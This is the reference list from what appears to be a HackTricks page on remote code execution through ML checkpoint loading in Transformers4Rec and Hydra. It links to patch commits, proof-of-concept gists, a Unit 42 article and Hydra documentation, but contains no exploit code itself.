- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 â€“ Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
